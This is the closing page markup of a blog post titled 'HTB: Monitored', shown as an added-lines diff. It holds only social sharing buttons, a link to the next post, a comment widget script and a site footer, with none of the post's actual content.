+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Monitored&amp;caption=HTB%3a%20Monitored&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Monitored&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f;description=HTB%3a%20Monitored" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f&amp;title=HTB%3a%20Monitored&amp;summary=HTB%3a%20Monitored&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f&amp;resubmit=true&amp;title=HTB%3a%20Monitored" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f;title=HTB%3a%20Monitored" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Monitored%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f&amp;t=HTB%3a%20Monitored" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Monitored&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f05%2fhtb-monitored%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/posts/2024/04/htb-surveillance/">
+                    <span class="button__text">HTB: Surveillance</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
